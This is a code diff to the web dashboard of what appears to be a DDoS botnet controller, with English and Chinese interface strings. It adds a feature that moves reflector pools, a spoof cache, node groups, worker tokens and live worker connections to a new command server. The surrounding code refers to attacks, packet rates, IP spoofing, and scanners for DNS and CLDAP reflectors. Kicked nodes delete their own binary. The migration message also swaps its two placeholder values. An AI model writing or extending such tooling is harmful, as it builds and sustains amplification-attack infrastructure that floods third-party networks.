@@ -512,6 +512,20 @@
             <button class="btn" @click="clearUpdate()" x-text="t('update_clear')" style="flex:0;white-space:nowrap"></button>
           </div>
           <div style="margin-top:6px;font-size:10px;color:var(--text);opacity:0.6;white-space:pre-line" x-text="updateStatus || t('update_tip')"></div>
+
+          <div style="border-top:1px solid var(--border);margin:10px 0 8px"></div>
+          <h3 style="font-size:12px;margin-bottom:6px" x-text="t('migrate_title')"></h3>
+          <div x-show="migrateMsg" style="font-size:11px;margin-bottom:6px;color:var(--cyan);white-space:pre-line" x-text="migrateMsg"></div>
+          <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:8px;font-size:11px">
+            <input x-model="migrateHTTP" :placeholder="t('migrate_http_ph')" style="margin:0">
+            <input x-model="migrateAdminToken" :placeholder="t('migrate_admin_ph')" style="margin:0">
+            <input x-model="migrateGRPC" :placeholder="t('migrate_grpc_ph')" style="margin:0">
+          </div>
+          <div style="display:flex;gap:6px">
+            <button class="btn" @click="startMigrate()" :disabled="migrating" style="flex:1" x-text="migrating ? t('migrating') : t('migrate_start')"></button>
+            <button class="btn" @click="stopMigrate()" :disabled="!migrateMode" x-text="t('migrate_stop')" style="flex:0;white-space:nowrap"></button>
+          </div>
+          <div style="margin-top:6px;font-size:10px;color:var(--text);opacity:0.6;white-space:pre-line" x-text="t('migrate_tip')"></div>
         </div>
       </div>
     </div>
@@ -673,7 +687,10 @@ function app() {
       worker_nodes:'Worker Nodes', tasks:'Tasks', steam_pool:'Steam Master Pool', manual_pool:'Manual Pool',
       page_prev:'‹ Prev', page_next:'Next ›', page_info:'Page {0} / {1}',
       st_tasks:'Tasks (7d)', st_success:'Success', st_packets:'Packets (7d)', st_traffic:'Traffic (7d)', st_peak:'Peak PPS', st_by_method:'By Method',
-      node_groups:'Groups (click = select)', no_groups:'No groups yet', group_name_ph:'Group name', save_group:'Save selection', group_name_required:'Group name required', group_del_confirm:'Delete group {0}?',
+      migrate_title:'Migrate Environment', migrate_http_ph:'New controller HTTP (http://2.2.2.2:8080)', migrate_admin_ph:'New controller admin token', migrate_grpc_ph:'New controller gRPC (2.2.2.2:9090)',
+      migrate_start:'Start Migration', migrate_stop:'Stop', migrating:'Migrating...', migrate_confirm:'Push all data to the new controller and switch all workers to it? Workers will stop attacks and reconnect automatically. This controller can be shut down afterwards.',
+      migrate_fill:'Fill in new controller HTTP URL, admin token and gRPC address', migrate_started:'Migration started: data pushed, {0} online workers will switch to {1}. Watch the node list - nodes switching offline then reappearing on the new controller.',
+      migrate_stopped:'Migration mode stopped', migrate_tip:'Moves data (reflector pools, spoof cache, node groups, worker tokens) + worker connections to the new controller. Old controller goes offline afterwards; worker machines need no manual changes.',
       col_spoof:'Spoof', spoof_yes:'YES', spoof_no:'NO', spoof_pending:'...', kick:'Kick',
       kick_confirm:'Kick node {0}? It will stop attacks, exit and delete its binary.',
       target_nodes:'Target Nodes', select_all:'All', select_none:'None', no_nodes_hint:'no nodes connected',
@@ -730,6 +747,10 @@ function app() {
       page_prev:'‹ 上一页', page_next:'下一页 ›', page_info:'第 {0} / {1} 页',
       st_tasks:'任务数(7天)', st_success:'成功率', st_packets:'发包量(7天)', st_traffic:'流量(7天)', st_peak:'峰值PPS', st_by_method:'按方法分布',
       node_groups:'分组（点击=选中）', no_groups:'暂无分组', group_name_ph:'分组名', save_group:'保存选中', group_name_required:'请输入分组名', group_del_confirm:'删除分组 {0}？',
+      migrate_title:'环境迁移', migrate_http_ph:'新 Controller HTTP (http://2.2.2.2:8080)', migrate_admin_ph:'新 Controller 管理员令牌', migrate_grpc_ph:'新 Controller gRPC (2.2.2.2:9090)',
+      migrate_start:'开始迁移', migrate_stop:'停止', migrating:'迁移中...', migrate_confirm:'将全部数据推送到新 Controller 并把所有 Worker 切换过去？Worker 会停止攻击并自动重连。之后本 Controller 即可下线。',
+      migrate_fill:'请填写新 Controller 的 HTTP 地址、管理员令牌和 gRPC 地址', migrate_started:'迁移已开始：数据已推送，{0} 个在线 Worker 将切换到 {1}。观察节点列表——节点会逐个离线并在新 Controller 上重新出现。',
+      migrate_stopped:'迁移模式已停止', migrate_tip:'迁移内容：数据（反射器池、spoof 缓存、节点分组、worker 令牌）+ Worker 连接目标。迁移后旧 Controller 下线，Worker 机器无需任何手动操作。',
       col_spoof:'伪造', spoof_yes:'支持', spoof_no:'不支持', spoof_pending:'检测中', kick:'踢出',
       kick_confirm:'踢出节点 {0}？它将停止攻击、退出并删除自身二进制。',
       target_nodes:'目标节点', select_all:'全选', select_none:'清空', no_nodes_hint:'无节点连接',
@@ -774,6 +795,7 @@ function app() {
     templates:[], selectedTemplate:'',
     logs:[], logTotal:0, logFilter:'', logStats:null,
     nodeGroups:{}, newGroupName:'',
+    migrateHTTP:'', migrateAdminToken:'', migrateGRPC:'', migrateMsg:'', migrating:false, migrateMode:false,
     scan:{ startIP:'', endIP:'', port:27015, results:[], scanning:false, error:'' },
     dnsScan:{ startIP:'', endIP:'', port:53, results:[], resultCount:0, scanning:false, error:'' },
     cldapScan:{ startIP:'', endIP:'', port:389, results:[], resultCount:0, scanning:false, error:'' },
@@ -1144,6 +1166,24 @@ function app() {
       const members = this.nodeGroups[name] || [];
       const online = this.nodes.map(n=>n.worker_id);
       this.selectedNodes = members.filter(id=>online.includes(id));
+    },
+    async startMigrate() {
+      if (!confirm(this.t('migrate_confirm'))) return;
+      if (!this.migrateHTTP || !this.migrateAdminToken || !this.migrateGRPC) { alert(this.t('migrate_fill')); return; }
+      this.migrating = true; this.migrateMsg = '';
+      try {
+        const r = await fetch('/api/migrate/start',{method:'POST',headers:this.getAuthHeaders(),body:JSON.stringify({
+          target_http:this.migrateHTTP, target_admin_token:this.migrateAdminToken, target_grpc:this.migrateGRPC
+        })});
+        const d = await r.json();
+        if (d.error) { alert(d.error); return; }
+        this.migrateMode = true;
+        this.migrateMsg = this.t('migrate_started').replace('{0}', d.target_grpc).replace('{1}', d.online_workers||0);
+      } catch(e) { alert(e.message); } finally { this.migrating = false; }
+    },
+    async stopMigrate() {
+      try { const r = await fetch('/api/migrate/stop',{method:'POST',headers:this.getAuthHeaders()}); const d = await r.json();
+        if (d.ok) { this.migrateMode = false; this.migrateMsg = this.t('migrate_stopped'); } } catch(e) {}
     },
 
     formatNum(n) { if (n>=1e6) return (n/1e6).toFixed(1)+'M'; if (n>=1e3) return (n/1e3).toFixed(1)+'K'; return String(n); },
